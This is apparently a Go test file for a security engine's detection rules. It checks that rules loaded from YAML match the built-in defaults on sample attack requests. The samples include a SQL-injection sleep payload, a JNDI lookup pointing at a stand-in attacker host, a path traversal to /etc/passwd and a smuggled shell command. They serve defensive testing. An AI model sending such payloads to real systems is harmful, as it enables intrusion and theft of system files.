package rules

import (
	"path/filepath"
	"testing"

	"justsoc/engine/internal/normalize"
)

func TestLoadRulesFromYAML(t *testing.T) {
	path := filepath.Join("..", "..", "configs", "engine-rules.yaml")
	rules, err := Load(path)
	if err != nil {
		t.Fatalf("Load returned error: %v", err)
	}
	if len(rules) != 18 {
		t.Fatalf("expected 18 rules, got %d", len(rules))
	}
}

func TestLoadedRulesMatchCurrentBehavior(t *testing.T) {
	path := filepath.Join("..", "..", "configs", "engine-rules.yaml")
	loadedRules, err := Load(path)
	if err != nil {
		t.Fatalf("Load returned error: %v", err)
	}
	defaultRules := Default()

	events := []normalize.ThreatEvent{
		{PayloadPrintable: "GET /search?q=1'+AND+SLEEP(5)-- HTTP/1.1", HTTPURL: "/search?q=1'+AND+SLEEP(5)--"},
		{PayloadPrintable: "GET /?x=${jndi:dns://abcd.attacker.test/a} HTTP/1.1", HTTPURL: "/?x=${jndi:dns://abcd.attacker.test/a}"},
		{PayloadPrintable: "GET /download?file=../../../../etc/passwd HTTP/1.1", HTTPURL: "/download?file=../../../../etc/passwd"},
		{PayloadPrintable: "GET /run?cmd=whoami;id HTTP/1.1", HTTPURL: "/run?cmd=whoami;id"},
	}

	for index, event := range events {
		for ruleIndex := range defaultRules {
			got := loadedRules[ruleIndex].Match(event)
			want := defaultRules[ruleIndex].Match(event)
			if got != want {
				t.Fatalf("event %d rule %s mismatch: got=%v want=%v", index, defaultRules[ruleIndex].ID, got, want)
			}
		}
	}
}
